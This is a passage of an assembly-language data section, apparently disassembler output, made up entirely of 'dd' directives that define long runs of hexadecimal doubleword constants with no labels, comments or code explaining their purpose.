		dd 0EA592CF0h, 0E13F60B2h, 0FBC88832h, 508D26DCh, 0FC1E3F4Ch
		dd 0F5EE1DE0h, 2BD74DB3h, 0FB5D5ADAh, 0C19EE66Fh, 0CE116CDCh
		dd 0E736A94Bh, 90C90AE9h, 0AA9EF1C0h, 90BE7D39h, 0FC9C2FA7h
		dd 7C23AE75h, 51ABC031h, 0E5284F98h, 7E5C7B66h,	0A534C636h
		dd 3E09ED07h, 86FEB038h, 29A2E93Bh, 0AA46CC33h,	0F29069Fh
		dd 0ADEBE2BFh, 6629103Ch, 71731291h, 0F0E8489h,	18069635h
		dd 0AADA0047h, 9B5567C0h, 0B18542BFh, 0B281E9CEh, 436F62Fh
		dd 7DFA627Bh, 0A4F054F5h, 78836EF5h, 0DE83B7D8h, 0CCB240CFh
		dd 0B9C80AA8h, 2A94AD3Eh, 0BEE60C0Ch, 265EAFDCh, 0EF327AD7h
		dd 973CB116h, 173C11BAh, 6A680828h, 63860072h, 0E81629D2h
		dd 2D0D8EC6h, 0E909AE67h, 5BF75360h, 94FA603Ah,	8964801Ah
		dd 7BEFA32Ch, 6B078B37h, 0D0A8793Eh, 0E45CFF93h, 8133C8FAh
		dd 0F4E8D019h, 63487741h, 74B5F89Fh, 650B72B3h,	0EA95BBEEh
		dd 89EE26DFh, 562959FEh, 1A11A3CAh, 0F212DC25h,	0E84D98A9h
		dd 0DECDFD4Eh, 0D447B541h, 0F29C1ACh, 0EE2AF1AEh, 0B483EACAh
		dd 1C4CA8FCh, 0C5EEFF73h, 61986BB0h, 4E667E40h,	2AC131E4h
		dd 16BE088Dh, 0BEA8DA39h, 0FD1676D8h, 0A62A882h, 7EA21127h
		dd 0C9648B8Ch, 27546020h, 0F69BB052h, 5065E1DAh, 0EC3B011Ah
		dd 572BC730h, 59558141h, 0DCBDB68h, 53D60E2Fh, 676F50EEh
		dd 20CECB0Ah, 0FDC017F8h, 18E65EF6h, 0FFCCB06Fh, 0CEF8D1F6h
		dd 68532963h, 38D28D76h, 739B1974h, 4636DA93h, 92A6D700h
		dd 0FE8A878Eh, 63BA2044h, 0E02466B6h, 7D047498h, 0C9C7098Fh
		dd 0CC099045h, 4E0E65FEh, 782DAED5h, 44B0817Dh,	608C140Dh
		dd 6F39D8C4h, 2D20934Ch, 2B4AB110h, 0E86AB5E9h,	773FA66Eh
		dd 3D041C3Ah, 0D4B266Fh, 85745E8Bh, 44DD2BF3h, 0EDC385E0h
		dd 0EE5ED714h, 9D744DCCh, 6C1DFA80h, 0FB125430h, 3A5E505Ah
		dd 0DF330889h, 0FA8938D3h, 22024A4Fh, 0E616F9E6h, 324792F3h
		dd 962C5AAh, 62BDA965h,	64BDF3AFh, 993B5347h, 5BCC4516h
		dd 8FED3DAFh, 13FB4B5Dh, 7EA9B4EFh, 0A28DDDA6h,	0B6009195h
		dd 838C595Ah, 0C1B1579Eh, 3798664Fh, 0F26D1B7Ch, 0E513AA9Fh
		dd 5659ED18h, 7E301798h, 7A1A6077h, 0A8FF6C18h,	0A0E4689Fh
		dd 42E0D2D2h, 7376C8Bh,	0A7C476B1h, 965DD7C8h, 7FFD1DEAh
		dd 2EC187CBh, 0AE310501h, 0C4BAD24Ah, 26B960A4h, 0F01837EAh
		dd 97CC7D3Ah, 0FD7B1A4Dh, 0F53D5831h, 50481013h, 2DDDDBBBh
		dd 8267DDD8h, 1391B9E1h, 1AAD0851h, 0ADE42766h,	0EC0A160h
		dd 1F58C1E6h, 52C9FADAh, 69ED02FEh, 8B74551Ch, 0AAEFCC68h
		dd 2B6A4F7Fh, 17F26323h, 526B4500h, 8A8B5BFEh, 0DD6D01E5h
		dd 8C2E8376h, 0ACFB8CE9h, 0F4872D0Ah, 0B58D44C4h, 5D7F7053h
		dd 9789E46Dh, 73A5E752h, 44B7786Ch, 0C761BE34h,	40A8EC29h
		dd 740F8F4Ch, 9EF5F36Ah, 0DD195944h, 65841EB1h,	0F0E1B0E9h
		dd 6027D2F3h, 72E84C23h, 28AFCA05h, 0A09E3804h,	0E77EA1A9h
		dd 3CCC1BB4h, 445125FDh, 17A6ECCDh, 40BB67BCh, 495CE64Eh
		dd 0FFE44236h, 0DE8DFEh, 9A637F31h, 73736D82h, 13D93DF5h
		dd 0ED9B9AEAh, 1120F48Fh, 20DACA8Ch, 0DE2DCAA1h, 0D5D06E25h
		dd 5727B3B8h, 0B3A8306Fh, 0DA6D6B8Fh, 877A282Bh, 69D614F1h
		dd 0F4745BEAh, 0D85AFFA2h, 76D9874Fh, 5EDE209Dh, 6A0D2031h
		dd 4178EED8h, 8726241Bh, 4ED3ACC9h, 3DC8D776h, 0FE05314h
		dd 0E630707Ch, 528B89BEh, 7E211CE1h, 116640E3h,	1954E109h
		dd 63784BCDh, 66E679E2h, 0E71A7F8Eh, 0EC56ABE4h, 0ACA2602Ch
		dd 59BC0668h, 67C023DCh, 5CA940E7h, 0A69A3CB7h,	5B74341Ah
		dd 4AE017D9h, 1D4A340Fh, 0B535608Bh, 6AB2770Bh,	0AF3859B3h
		dd 0DA55694Eh, 59F069DAh, 0AA20BC99h, 0C343706Ah, 6859260Bh
		dd 6D29AE9Ah, 0E6E5043Fh, 4427AECDh, 0CBBC74E4h, 0DB7ABE47h
		dd 603E0ACBh, 0CB28284Eh, 0CAFA6397h, 0FACEE0EDh, 7C26DCAFh
		dd 0C75482EDh, 0E36F670Eh, 170569DAh, 0D3EA8C20h, 49382746h
		dd 0D1B630F2h, 0A2360DAEh, 5A69D331h, 985CE70Ah, 61C07206h
		dd 0C15ABBAEh, 0EC917E64h, 6D2D7A3h, 523C6A74h,	0EC1794E6h
		dd 0EFF8E1CDh, 98B3720Dh, 6F7DD62Bh, 0E8B857A5h, 58C373A6h
		dd 7DC9E037h, 0CF3748A2h, 6916C494h, 0E66263D6h, 0EDEC20B5h
		dd 0BC13E29h, 3482EBA4h, 8338A507h, 0DAF6A35h, 1CFEEECh
		dd 0AD44FADh, 0AEA57E86h, 8EACB6Bh, 0D75C5EB4h,	9FD7979Ah
		dd 73749BDDh, 72CB4839h, 47E05D5h, 2D6C5A61h, 0DA045F1Fh
		dd 0A0B2E912h, 8F442D05h, 0E03F2C6Bh, 0D4A76D5Ah, 8595EB03h
		dd 0BBAB09B3h, 7F5C5AD0h, 0EF9059DAh, 0DB9712E0h, 8F15975Eh
		dd 0BDB9FDAFh, 1251313h
		dd 79B2C8C0h, 0B6910E7Ah, 4B4DE2B0h, 60BBE11Eh,	0CADEFF0Dh
		dd 84BA9A2Fh, 1BB5D74Fh, 0BCFC8956h, 0B098B351h, 5166DB9Bh
		dd 0FE406B83h, 79574DA1h, 6EA6417Ch, 0F0E71E1Bh, 0ECCE828Dh
		dd 9A19D294h, 20745F59h, 0E5AF673h, 6FE52915h, 0FE770E93h
		dd 37BDA6CDh, 0CBA84D75h, 481BB1FAh, 0B3CAB65Fh, 0CCCD10CAh
		dd 40B39B42h, 718FE8FDh, 0DC8E1503h, 5E3322Fh, 671D1B53h
		dd 77E184F2h, 0BC37E604h, 0FE806776h, 7CCBF3B9h, 0D959CD81h
		dd 8C314A0Ch, 0F604FB0Bh, 0B12373E5h, 77FB24ECh, 0F80070B7h
		dd 91F3BB90h, 33985424h, 90DC3D08h, 7AD5556Ah, 16BC628Eh
		dd 124B5BAFh, 0E939B803h, 92BDCEBBh, 0A886865Ah, 8317Ah
		dd 0C28CC0BAh, 0B9C7BF22h, 0CBB03380h, 4A366747h, 0C92AA95Ch
		dd 92BEDCB7h, 8FD2D394h, 40EB3A82h, 8EFF670Bh, 0EC456678h
		dd 0C84AF2A9h, 0B9A0FEB1h, 81099B8Dh, 0F0EB3998h, 6EAD26C8h
		dd 63062656h, 9AF5329Eh, 9CF77B0Bh, 4EFB9ABh, 4233FD92h
		dd 72B97875h, 0DEEA54D5h, 1F7FACF2h, 0B4D94B3h,	63AC5544h
		dd 790D02FCh, 84EF226Ah, 2F19ABh, 8C09B81Bh, 26C8AA82h
		dd 24D4F426h, 0E1C76F11h, 0E8015F3Bh, 0FC5131B1h, 60198A36h
		dd 0CF28F610h, 7C25C92Ah, 61E7D1BCh, 0F5DC9FD2h, 0BD1F2775h
		dd 36F4EA5Fh, 0B1AEF53Ah, 282098AFh, 0F88C054h,	9A581840h
		dd 6BF524A2h, 0B47E70F1h, 0F7447C43h, 33296A69h, 0DBF43BA4h
		dd 0F89077F8h, 0E12D1D1Dh, 0D40C2D5Fh, 6AB3BB11h, 0EF0DE0C5h
		dd 0F4E6C10Ah, 0D490931h, 5848CD1Ch, 0F91CBA59h, 0E0C9606Fh
		dd 679E8DA9h, 0BD275C10h, 790FC1h, 82B4A267h, 0B0BA4A52h
		dd 0C6899670h, 39A34801h, 8BD0632Ah, 0D101F11Bh, 33119220h
		dd 0F2DE58A7h, 0CBB70DF0h, 0D072B339h, 0F29FC66Dh, 1BCCC650h
		dd 47B50281h, 91F3867Eh, 0FF7D38A4h, 841900C1h,	0CAF78FF6h
		dd 4A39320Bh, 0C5ECA581h, 118EAE11h, 70931DBFh,	80BAF6ADh
		dd 0BDA4AB4Dh, 0DE63580Eh, 30FF769h, 6FFCF43Eh,	5D72C555h
		dd 5E889C28h, 6FEB6D03h, 2D8F9E8Bh, 4353B084h, 82914C45h
		dd 3EA88609h, 0B95563D1h, 0C6BA92F6h, 1050C278h, 0FA2FFE94h
		dd 0E05C0AF6h, 6ED2B4D3h, 0AC11B06Fh, 2DD475B7h, 70E38B55h
		dd 40E3A8BAh, 0B28FF01Eh, 2ED33BD1h, 0BD7382CCh, 8850F6A2h
		dd 9BA1BA55h, 86EF0E5Dh, 0DBDE4028h, 99E13970h,	0FA4FD2A1h
		dd 0C44E215Fh, 7718AC8Ch, 4ADAE23Bh, 3B6E502h, 0FD98E690h
		dd 0F0C7C189h, 0D4C1A60Bh, 59333AFEh, 6D27DD35h, 5FB0019h
		dd 1AD76ECBh, 0F3BF75EEh, 285676C7h, 490EE846h,	0CA924614h
		dd 0D0DF06A9h, 867FBCBEh, 0AA7B744Ch, 829C1756h, 3C7076CAh
		dd 0D83B80A3h, 351F48DEh, 0C81AFA4Fh, 0F2474FC0h, 24F31640h
		dd 3F5BEBF1h, 0F898ABC2h, 0B770EB62h, 6DD393A8h, 7493B40Ah
		dd 6BC3FB2Bh, 20931B9Fh, 57FD9952h, 0CA9BFC3Dh,	50903401h
		dd 37D7329Ch, 2CCE28BCh, 0ACA9A6A1h, 84AF4C60h,	0FB03366Bh
		dd 64B0DCBCh, 8776921h,	99C24A54h, 880F765Ah, 5DB44BE8h
		dd 0FB76D1B0h, 82636EE9h, 704BEB43h, 0E6784240h, 1118C506h
		dd 0FD0879A9h, 0B62A65E9h, 1285B17Fh, 7BDDABEFh, 0D73721ECh
		dd 0A28AE087h, 159C272Ch, 0F45575D5h, 7BC5F335h, 8EA0453h
		dd 5E47927h, 0ED1B9EA4h, 0C9354FE3h, 0A1D0543Ch, 33DA675Fh
		dd 8B365E26h, 0E685DAFFh, 0A5B40899h, 5CA3454Fh, 0E9E6C096h
		dd 0F9BB3128h, 0B1E06E82h, 768B9BEAh, 0B7249BEBh, 702ACACh
		dd 0A33A679Ah, 7D2B93B1h, 4E656236h, 216E403Ch,	7D37BEC2h
		dd 8203A1D1h, 759B3AD2h, 9FEEAC82h, 7EE95F62h, 0F0685A11h
		dd 49112F0Ch, 0E2AA4CC9h, 0DE391987h, 0E7800EECh, 8F1C3078h
		dd 6BF3CACAh, 0BAD4AF9Dh, 0D9D75D06h, 0E74781E8h, 0A7E4A857h
		dd 491D974h, 42C25B18h,	14245DEAh, 0FB9C91A5h, 3FA927E6h
		dd 3D087FE7h, 0D6A20FBBh, 0CB100ADCh, 9F69FAEDh, 9031E2E9h
		dd 8E43D0F4h, 0CB29AEB0h, 48085C1Eh, 519CA01Ch,	0C90062E4h
		dd 0A3869E17h, 0A0433EB1h, 9DC84396h, 0E901659Eh, 9E6BED0Eh
		dd 0CD85CA38h, 7DEBB684h, 9E640136h, 175F6B49h,	1646EC08h
		dd 8EFB57ECh, 4C9C2D79h, 54995A0Eh, 0DCD7DD50h,	467AA506h
		dd 0C77DEC4Ch, 0FDE09429h, 0C8CEF7E6h, 41CAA7A7h, 95BABFABh
		dd 0CACB24F3h, 5F0EE7BBh, 0BD8DF892h, 6A9056B0h, 79CBEA19h
		dd 73590D34h, 12EA4722h, 0F7DD4CF0h, 66F79E25h,	0C20D4DDAh
		dd 6E913C16h, 0E71024ABh, 0D172C18Ch, 990B83A9h, 2CEA6511h
		dd 0C529AE35h, 37C19155h, 0D81AC0Ah, 84C421F6h,	0AC336B37h
		dd 0F401BCEh, 0A35FF437h, 0CC80BC2Ch, 0FD452718h, 0C60D0CCDh
		dd 542F6EC8h, 0B11090D9h, 5F0C562Eh, 515FE250h,	0CAF23990h
		dd 5F84F813h, 62BF65Ch,	0F6D8F8F8h, 0B89B405Ch,	13EBCE06h
		dd 0DD15912Eh, 0A391E124h, 0A1D57633h, 0ADDABE0Eh, 19707B17h
		dd 0AAC8653Ah, 0D223D413h, 75E9A796h, 80363EE1h, 95AE15D7h
		dd 0FFCD6EFEh, 7608620Fh, 5BB6028Fh, 0A472F377h, 0FDB447B5h
		dd 0F963E476h, 0DB434D1Fh, 8A9381E9h, 0A03A5C11h, 735B0F26h
		dd 771DD8E2h, 38B98DFEh, 75D962C0h, 61F6B90Ch, 82930EADh
		dd 298C75FBh, 0B17F95A8h, 0C10485F4h, 0C50DFE0Ah, 0A93DCEA5h
		dd 0B3461E14h, 0C9E772A1h, 7598BB88h, 910D34F6h, 21D23CA0h
		dd 0E4908671h, 0DA8E633Fh, 0EB51CB63h, 6ADBE828h, 989171Ch
		dd 7BB6AA8Ch, 2F56DDC4h, 3DAF3B00h, 0A0C7E0FFh,	47AC692Bh
		dd 0E8D01258h, 745F343Ch, 7185656Ch, 7AC4F370h,	64B95024h
		dd 23E1F4BEh, 0C065D99Dh, 9C742F65h, 3AC4D233h,	44CE191Fh
		dd 763D9A86h, 1BECB5A3h, 6C0CC419h, 90FA8822h, 26121E06h
		dd 5A871ADFh, 0B16A066Bh, 0AA16DC51h, 440659AFh, 0B31BC235h
		dd 0A4F11A26h, 0F04288B7h, 50F487A1h, 415D20Eh,	3ECCC04Bh
		dd 73C6F5B3h, 3A02E50Eh, 0F150E9A2h, 0B5B1A6C4h, 2F05A35Ch
		dd 2FEC7D8Ah, 62856805h, 64079509h, 0AC2DEE34h,	4CC27946h
		dd 7E4EC1BFh, 0CF87AB29h, 95FD15B3h, 0A13EFD7Ch, 0A200C472h
		dd 4CC31EA3h, 0AC560D63h, 0A51325D0h, 8EDA3199h, 101F2032h
		dd 8F8C61C3h, 0CF98B209h, 0BE955F4Ah, 0C9661DA1h, 0C8C290EEh
		dd 67077DE1h, 0CFBB1D64h, 1AEBCF89h, 0E226D55Dh, 0F423EA9h
		dd 4A9C1868h, 58398F07h, 0BEB05983h, 9535500Ch,	355CB788h
		dd 996C3463h, 4E6B77E9h, 0C681AE46h, 3EE8897Dh,	307D7ABFh
		dd 0ECA82C20h, 41650310h, 4A721727h, 6D58424Ch,	0F33F8AFAh
		dd 6CE7DEDDh, 0EF92D458h, 61DCF872h, 0F25D1639h, 0AA78BE41h
		dd 0C9B969B9h, 8F8A29D3h, 0B812171Dh, 795E4091h, 9814816h
		dd 0DCB5C957h, 3C64B2ABh, 9D60D8E2h, 8A086E11h,	4B53DABh
		dd 610064BBh, 5A5B1D15h, 0DEA46F5Bh, 445331BFh,	0EAB53C46h
		dd 8C0491CAh, 0AD80D7C6h, 548618A6h, 0F459EF53h, 0A38B64DBh
		dd 0F66DC16Ch, 33AE51CBh, 2214B599h, 0D0DBAC8Ch, 0A60CDD23h
		dd 7EEEBB34h, 0F050A16Fh, 1FC8684h, 0F33E9B3Bh,	0A691B48Fh
		dd 757AE077h, 0D36FAECDh, 905B369Dh, 97AEEE54h,	74E39529h
		dd 0B73472BCh, 6CE3B097h, 0B9963240h, 4C428EDFh, 0F9ED795Bh
		dd 24CEE328h, 322291D5h, 0D7B0FFC4h, 0F02452C6h, 7E6AC97h
		dd 419F6386h, 6F9FC85Bh, 0D5DC0601h, 77EF87F2h,	2F756D64h
		dd 66311FBBh, 0CC03E30h, 0F4ACED90h, 69FD50CEh,	0FE43DEABh
		dd 20944FFBh, 3E471047h, 9C6ADEA2h, 0BC56E067h,	82A27E9Fh
		dd 9931ACE2h, 3005FE16h
		dd 6754DB11h, 4D222966h, 0F4958A2Bh, 6DD82FA6h,	0BED8F33Eh
		dd 68279F64h, 0D725D0F2h, 0AFEA1647h, 0C1CA85CDh, 0D0C36302h
		dd 0E7287E1Eh, 0F52E076Fh, 43B95515h, 668805FCh, 4C8EE1C2h
		dd 0EDCCEFCEh, 683C2118h, 0DAA69DD0h, 47C68DB4h, 5F5A6792h
		dd 0FCE9427Dh, 0EDACE88Dh, 0C34220E4h, 21700937h, 6C480B1Ch
		dd 0A2A11AD5h, 0CD65F55Dh, 293BD12Fh, 0E3D68F6Bh, 27E2B379h
		dd 6B72B346h, 9A7C197Ah, 9038D1C7h, 8E8C880Fh, 7E889268h
		dd 73994E4Ah, 0F9FEBBC8h, 7280A31Fh, 5BC8EDE2h,	65952A1Ch
		dd 0D56F482Fh, 14F7C71Dh, 2FD26036h, 20CEF0DDh,	1024128Dh
		dd 0B7B01CBBh, 76B862F1h, 54D1233Ah, 32605BDh, 87995FFAh
		dd 4DD80FBDh, 0E1DF1F1Ch, 1E568C11h, 5DB55999h,	0AB929E17h
		dd 6A924B5Ch, 0A4D5C4B4h, 1654660h, 0DECE4ECAh,	9D79CD7Dh
		dd 4A772AA3h, 0FE78AAAAh, 0A5E7CCA2h, 0FF045FC5h, 0E80E1ACAh
		dd 5597FE9Eh, 65DA22A7h, 4D9A8ED3h, 0C221EE70h,	0C33BE760h
		dd 781EF024h, 0A92977E8h, 0FB4DE66Bh, 0F2E73B34h, 51BFD84Ah
		dd 5220D8F6h, 73783C4Eh, 0B2E51EF5h, 8CF486C6h,	0EB181210h
		dd 4284543Ah, 73F585F8h, 1602DDD2h, 0F6C8B142h,	562F25D3h
		dd 0E21AA3BEh, 0D702BEE9h, 0B3B00945h, 46ABFE3Ch, 8B4E7499h
		dd 0BDE0F26Ah, 90D63880h, 0FED3BEDBh, 5914E0ACh, 2554491Ch
		dd 0DF734139h, 95C4791Eh, 3B5456AEh, 86D9FE94h,	0A4FFF034h
		dd 400CD259h, 49413866h, 0CAE0AE38h, 0FCC1C575h, 656003A8h
		dd 0BDBCDA70h, 772F2FABh, 0CB8AFD53h, 26DB1110h, 0CB08DF54h
		dd 0BE5A5816h, 0FFE3D90Ch, 97A5EF60h, 0C09DEB4h, 0BBFDD2B4h
		dd 8C7F9FABh, 4D302ADAh, 0C2B40BCFh, 88D7D0Eh, 31384682h
		dd 59938DB0h, 58ADBAAEh, 0F38B8FADh, 6DC5F361h,	2A803DAFh
		dd 0D82197B5h, 72752772h, 52539B5Ch, 0E95C5176h, 0FE289687h
		dd 0FE1BCD4Dh, 73F6A54h, 0EA8490E4h, 694F300Eh,	0D9BC8064h
		dd 85786809h, 37553D02h, 329EE2D2h, 4CE1A52Fh, 71A73EB2h
		dd 0B3B5A3BDh, 23973F40h, 5A1FBF2Ch, 0B5DC907h,	9318AB91h
		dd 36B1DD28h, 25E82D65h, 9FAB840Ah, 0F07BD8D1h,	0B18490F0h
		dd 0E1602513h, 7F47AB5Dh, 0E2E50005h, 0AC38C80Dh, 0DDF72921h
		dd 113D2ADh, 0E2391B3Dh, 1F12D521h, 844C3C59h, 81B3D36h
		dd 0E5D1416Fh, 2CD51347h, 0C7AF949Dh, 2619C10Dh, 0C08D5B5Ch
		dd 3AF2D54Eh, 0C10B9DAh, 0CF6320E0h, 0DF9E72E3h, 0A0A409B0h
		dd 1EDC761Fh, 0BFB92E3h, 0E4B66224h, 9CAEEA3h, 378D39D8h
		dd 73DCFBAh, 488F3190h,	9729D369h, 90F26272h, 0B56588AEh
		dd 3CB162A6h, 0F527A694h, 0DD0A85D2h, 1A83AEAh,	0BE1C22EFh
		dd 0F82F0F5h, 0C05843C5h, 69B5A8E5h, 0F646674Dh, 96EA0341h
		dd 7AFFFA19h, 0A22D5AD4h, 0AB9C3368h, 899D1407h, 6C10E91Ah
		dd 1B2ECF92h, 8B065E89h, 818FC1BCh, 6A79207Ch, 0BA1C9E14h
		dd 9255D8F3h, 2B15B317h, 0C3AC8635h, 5E07912Bh,	6C4C9402h
		dd 0DEFDA6C9h, 0C2CF4D26h, 17042D5h, 5D0AD89Bh,	36AFE56Ah
		dd 15C4D0DFh, 0C7EDAF22h, 0AD34D708h, 49D19FFBh, 11B4CDFDh
		dd 37C94D63h, 0D6DE2B5Ah, 0E6FF4FF0h, 0A9DB0652h, 0D4DA5DE5h
		dd 0B84E5379h, 6BF2F49Dh, 0D876A01Ah, 0A90C7CD4h, 74C5F63h
		dd 3FCA0142h, 1B6B2CE9h, 10E04DFEh, 3ACD91BBh, 813812AAh
		dd 6B9B3538h, 0E3E16490h, 1F5ED005h, 0B1A03BBFh, 7C25088Dh
		dd 85B8FDFAh, 38B4D094h, 0E21C1ED1h, 6B5F5621h,	0D89A5F9h
		dd 0AD119206h, 0FE7CB224h, 70A7771Ah, 2257E8DDh, 0E0C70F58h
		dd 0C186AD5Ah, 6B68EAACh, 9F2096FBh, 0CA315437h, 0DBAE82F3h
		dd 9125E922h, 0CCCB50B4h, 0E4972D25h, 0E2CC63A9h, 111FDA8Dh
		dd 0C165B1A1h, 2185D3DBh, 71E3A050h, 22762655h,	4141F905h
		dd 0BBFD26B0h, 0E3830DEAh, 0DBA06437h, 8DFA1534h, 8D648F03h
		dd 42056F61h, 0B589275Ch, 2A13E454h, 95F25150h,	9310AA9Bh
		dd 17839AB4h, 26CB902Eh, 0CFB72D0Dh, 5FD1F0B1h,	0A89D1708h
		dd 0E7C9F63Fh, 7C313659h, 7910D269h, 0B69B598Ah, 67A7BF17h
		dd 35039804h, 0A380B7A4h, 0CD8218F4h, 48AC2E5Eh, 0C3813A06h
		dd 890C3442h, 0BFE498BDh, 0B9722E25h, 0A1B32363h, 7A623CB8h
		dd 0B37B4F5Bh, 14DEF73Ah, 95B8CEBDh, 77DC0F81h,	140C7B6Fh
		dd 0B0E1CDCh, 623C1C9Ah, 48FC8DD2h, 0EF4E2CBh, 0BF53C4AEh
		dd 0C4B0B484h, 0ABB69E56h, 12A7A75h, 0E42C6E85h, 0ABCEF4D6h
		dd 83A84E66h, 0CB611FFBh, 0D86C0D1Eh, 0F614D1E7h, 0B580FA9Fh
		dd 0BA6F9E46h, 0B3359396h, 904DF970h, 0C6B78A5Ch, 47BB5BD0h
		dd 15A796FBh, 526CD11Fh, 4BE4EE46h, 0E03E86Ah, 0EA133E9h
		dd 51102573h, 499ED673h, 449389A4h, 5E32AF49h, 0B8AAE7ACh
		dd 7E793B2Dh, 6A17630Ch, 0B2FA871Ch, 8BBD70EAh,	386A6DDEh
		dd 7FE8F73Bh, 0F4343EE2h, 0A2A7745Fh, 0C402CE8h, 0B415D8BEh
		dd 26D0A70Fh, 1699B373h, 0DCFFB23Ah, 1B18AB14h,	117D738Bh
		dd 9A614DE1h, 0DE597908h, 0FDF51E77h, 22055B3Eh, 46410F76h
		dd 52657C93h, 72561306h, 1EFD189Ch, 7F7C8889h, 659823A8h
		dd 0F4B6B560h, 0F2ADCFCDh, 0D21DFF86h, 98DD2334h, 359B84B0h
		dd 92B61529h, 0FA16C02h, 45CC7F45h, 8417E6ECh, 0F6F479FFh
		dd 0A2978F0Bh, 94F233CAh, 87513214h, 88FFD599h,	84A10B1Ah
		dd 7B70644Ch, 0A0B11775h, 806782D5h, 10296E7Ah,	7B7CD7Dh
		dd 0A7A77983h, 0AD86FE0Ch, 59167FDCh, 0B6D5BEDAh, 0FA99E5C8h
		dd 0D27A3986h, 0D4E4AC66h, 545CFCE8h, 0B66CB6DAh, 1B38D69Ch
		dd 0F9CFB63Ah, 0FB9EE7AAh, 1579A643h, 0F1F5B04Fh, 14122E55h
		dd 1DC9B079h, 0D9888110h, 8DEB9BBCh, 606C2475h,	3D71E7ADh
		dd 0EF24F489h, 2F9CBBCEh, 0B8C6BD0Ch, 158B93ACh, 181E68DAh
		dd 4900EF8h, 7EDA833Bh,	0A2F5EC75h, 0D53DFC4Eh,	991A623Ch
		dd 0E540943Ch, 0F685468Eh, 0AB53B946h, 4E64EA82h, 0FA361AB7h
		dd 178132DFh, 82443184h, 0B25D8DFBh, 5D24A710h,	81A96BCAh
		dd 0ECDBA4CFh, 46435592h, 750A8E09h, 0FD5E266Fh, 8F240F55h
		dd 8598B58Bh, 5ED734ADh, 0F20A5D19h, 0F64103FEh, 924812C4h
		dd 0ABFFAA09h, 871CA9FBh, 73BC1110h, 3CA5DC67h,	935C4B69h
		dd 0DD790081h, 66B17202h, 9E16198Bh, 9506356h, 2F284ECBh
		dd 0E909013Dh, 0B668F77Dh, 24FD108Ah, 5456FEB8h, 0A8A3D809h
		dd 65529C45h, 0EAF42D12h, 0AFC4B6B0h, 0AE611496h, 859EA3A5h
		dd 960926DCh, 4DC3F32Dh, 85BD5B9Dh, 23FB308Ah, 1EC9AF09h
		dd 195B5D50h, 0E0D20EE2h, 0AD4CB62h, 0E3281CDDh, 0BCAB787h
		dd 72B24535h, 0EA1F647Ah, 0C0A947B0h, 0CEB27278h, 0C49793Bh
		dd 20EFDB8h, 4B4CF604h,	6E4FFB5Fh, 2B634FD7h, 0D737540Dh
		dd 35A9F060h, 9E73952Eh, 278CA162h, 77E666BCh, 7CE5897h
		dd 82869A8Ah, 0D740B28Ch, 0CFA46A59h, 0A778FCD3h, 6E61EE70h
		dd 0FA373DF6h, 0BA394F4Fh, 0C68CCF19h, 3C47B85h, 0F026B920h
		dd 0D9BCC642h, 0EDA74F2Fh, 490349BAh, 488DFAD7h, 5DE37327h
		dd 523C0B22h, 46EBC30Ah, 9D4A3209h, 422A5453h, 7070F32Bh
		dd 0DDF89BCEh, 3BA27414h, 0EC8596D4h, 0EEE9D907h, 1699C299h
		dd 0BE4D91DFh, 0AADD1B4Eh, 0D5649E9Eh, 0EF44747Eh, 509E26ADh
		dd 0EF98FE76h, 8C4C535Bh, 0E567140Dh, 57459318h, 313050C6h
		dd 0E43683E6h, 961C7D2Ch, 0C95868D8h, 0ABDAE28Fh, 3D2704E4h
		dd 0C3AA9C8Dh, 0C906825Dh, 0A6D898D6h, 0E56F013Ch, 176DE884h
		dd 0B6FC7F07h, 1A4EE20Ah
		dd 6B4AC04Ch, 1C83B1E4h, 0C12D0BE3h, 6F13FC6h, 6EFF5B72h
		dd 28889718h, 4D952A46h, 43C5A7BBh, 5C4DB3ADh, 7AACD91Dh
		dd 32E3A6BCh, 6295F48Ch, 0A9DE0A44h, 80BA495h, 21F80F34h
		dd 9B56EAh, 8C799DA6h, 0A1E156A8h, 0D2ED5CF0h, 0F9D93C2Fh
		dd 9F7DA14Dh, 66789DAFh, 0C380049h, 79F84E0Dh, 0D42E41EAh
		dd 6945707Bh, 40F921D0h, 0E5BF7B6Dh, 7C075030h,	0A390A10h
		dd 0C7CFB0C7h, 0EA93B5EAh, 93CF19EDh, 0B8BDBDBFh, 9252BE5Dh
		dd 23DC978Bh, 0CC0CA2A0h, 1877B1BDh, 856541D6h,	3576D771h
		dd 0F5D9213Ch, 540B7B15h, 25626C37h, 7800DFE4h,	78D99C5Ah
		dd 76B2926Ah, 0CCD3179Ch, 1B71781Ch, 0DB2CBD2Ah, 0D47A2B46h
		dd 0C8ED5EDh, 0ED825E78h, 5D77388Bh, 15DDBE67h,	95CDAF53h
		dd 21D3AE97h, 0A0B42022h, 0BC22B95h, 959480FDh,	0A23363DEh
		dd 0CE2DD2DAh, 65AB6F8Bh, 272D4440h, 9DCE727Ah,	0A735461Bh
		dd 20C0696Dh, 0DB988369h, 468882AAh, 6BD13DA2h,	73336FF9h
		dd 945C9972h, 27DDD876h, 6698BEAEh, 7F1249B6h, 0CFA15CF3h
		dd 0FE72AD34h, 53ED14A3h, 7533EA04h, 27FEF819h,	91FC7D38h
		dd 0E01DB877h, 0E7C9AB29h, 0F77C75B8h, 636FBA26h, 8F511CB2h
		dd 1D38A0EEh, 67A38119h, 94BC16B4h, 7ADC5780h, 73D1908Dh
		dd 9EC755Ah, 0D4CD4956h, 0C14817A0h, 0E7AC9Dh, 0A32FDCAAh
		dd 5FEC5D32h, 0F9E96236h, 0D4B3E2Eh, 5AD4622Ch,	0B88E8A54h
		dd 8CEA5F55h, 7C4C29ACh, 2B705C5Eh, 0D2EE78D6h,	4283FA46h
		dd 0FD42E1C3h, 0EC99F1BAh, 0C8830E6Ch, 0B66C7A32h, 18F1B49Eh
		dd 8203BF80h, 0CF1FBE1h, 3FFB4AE6h, 0DEA40745h,	2F7ADAE1h
		dd 8A820BE8h, 0D612AD09h, 0DD1E621Bh, 725C55F8h, 2C91469Ch
		dd 37423EC4h, 0F13C3BF5h, 0A97BA405h, 94F65D20h, 0A0F2312Fh
		dd 53CA3995h, 8CCEA7h, 7586D4C7h, 138B6121h, 0FC2F0399h
		dd 2C73627h, 70E6A7AFh,	0DB8837C1h, 43192D1Ch, 0EAC11479h
		dd 0DB776B05h, 0C79B4F22h, 0EAE44AC4h, 7A1E928Bh, 2E7B7E2Eh
		dd 706B264h, 0CD601B54h, 4EC4D81h, 0CDF2B576h, 88BF6E57h
		dd 0AAE2A881h, 0F8918540h, 801F898Fh, 63F2EBE8h, 0D575EFB9h
		dd 7A52AD49h, 0B47A5631h, 1646935Ah, 4AD6A91Bh,	0D7F6600Dh
		dd 9DF1F66Ch, 8D344F6Fh, 1F56CB67h, 86ABC59Bh, 0AD119D21h
